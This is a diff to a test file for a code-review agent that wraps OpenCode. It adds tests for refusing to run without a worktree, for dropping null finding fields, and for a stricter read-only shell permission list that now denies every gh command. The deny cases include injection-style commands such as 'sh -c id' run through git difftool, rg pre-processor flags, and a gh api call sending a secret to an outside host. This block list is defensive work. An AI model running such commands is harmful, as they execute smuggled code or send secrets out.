@@ -1,7 +1,7 @@
 import { chmodSync, existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
 import { delimiter, join } from "node:path";
 import { describe, expect, it } from "vitest";
-import { buildPrompt, extractObject, normalise } from "../src/agent.js";
+import { extractObject, normalise } from "../src/agent.js";
 import { prettyModel } from "../src/cursor.js";
 import { READ_ONLY_BASH, SHELL_NOTE, opencodeLabel, opencodeReply } from "../src/opencode.js";
 import { newDir, run } from "./helpers.js";
@@ -399,6 +399,20 @@ describe("agent opencode", () => {
   });
 });
 
+describe("agent opencode without head/", () => {
+  it("refuses to run, since it cannot read the code any other way", async () => {
+    const { workdir } = staged({ worktree: null });
+    writeFileSync(join(workdir, "findings.json"), "[]");
+    const { env } = fakeTool("opencode", { stdout: ocText("m1", fenced({ findings: [] })) });
+    const { code, error } = await agent(["opencode", "--workdir", workdir, "--method-file", method], env);
+
+    expect(code).toBe(2);
+    expect(error?.error).toBe("bad_input");
+    expect(String(error?.message)).toContain("opencode reads the code only from gather's head/ worktree");
+    expect(existsSync(join(workdir, "findings.json"))).toBe(false);
+  });
+});
+
 describe("agent arguments", () => {
   it("prints the prompt and runs nothing with --print-prompt", async () => {
     const { workdir } = staged();
@@ -496,6 +510,11 @@ describe("normalise", () => {
     expect(() => normalise({ error, findings: [] })).toThrow("could not complete the review");
   });
 
+  it("drops a null line, start_line, side or start_side on a finding", () => {
+    const row = { path: "src/app.ts", severity: "P2", title: "T", body: "B", line: null, start_line: null, side: null, start_side: null };
+    expect(normalise({ findings: [row] }).findings).toEqual([{ path: "src/app.ts", severity: "P2", title: "T", body: "B" }]);
+  });
+
   it("treats a null error as no error", () => {
     expect(normalise({ error: null, findings: [] })).toEqual({ findings: [], suspicions: [] });
   });
@@ -547,10 +566,15 @@ describe("opencode permissions", () => {
     // The last matching rule wins.
     const keys = Object.keys(READ_ONLY_BASH);
     const lastAllow = Math.max(...keys.map((key, i) => (READ_ONLY_BASH[key] === "allow" ? i : -1)));
-    for (const pattern of ["*>*", "*--output*", "gh api * -X*", "gh api * -f*", "gh api * -F*", "gh api * --input*"]) {
+    for (const pattern of ["*>*", "*--output*", "rg *--pre*", "rg *--hostname-bin*"]) {
       expect(READ_ONLY_BASH[pattern]).toBe("deny");
       expect(keys.indexOf(pattern)).toBeGreaterThan(lastAllow);
     }
+  });
+
+  it("allows no gh command at all", () => {
+    expect(Object.keys(READ_ONLY_BASH).filter((key) => key.startsWith("gh"))).toEqual([]);
+    expect(SHELL_NOTE).not.toContain("gh api");
   });
 
   // OpenCode's matcher: * is any text, the rule matches the whole command,
@@ -572,7 +596,10 @@ describe("opencode permissions", () => {
     ["ls", "allow"],
     ["ls -la src", "allow"],
     ["rg -n tenantId src", "allow"],
-    [`gh api "repos/o/r/contents/src/app.ts?ref=${sha}" --jq .content`, "allow"],
+    [`gh api "repos/o/r/contents/src/app.ts?ref=${sha}" --jq .content`, "deny"],
+    ["gh api repos/o/r/issues/1/comments -if body=hi", "deny"],
+    ['gh api "repos/o/r?d=secret" --hostname example.invalid', "deny"],
+    ["base64 -d -o out.txt in.b64", "deny"],
     ["git difftool -y -x 'sh -c id' HEAD~1", "deny"],
     ["git diff-tree -r HEAD", "deny"],
     ["lsof -p 1", "deny"],
@@ -589,13 +616,6 @@ describe("opencode permissions", () => {
     ["sh -c id", "deny"],
   ])("decides %j as %s", (command, decision) => {
     expect(decide(command)).toBe(decision);
-  });
-
-  it("allows the quoted gh api read the prompt prints", () => {
-    expect(READ_ONLY_BASH['gh api "repos/*']).toBe("allow");
-    expect(buildPrompt({ repo: "o/r", pr: 1, headSha: sha, worktree: null, repoRoot: null }, "/w", "M")).toContain(
-      `gh api "repos/o/r/contents/<path>?ref=${sha}"`,
-    );
   });
 
   it("tells the model to return an error for code it could not read", () => {
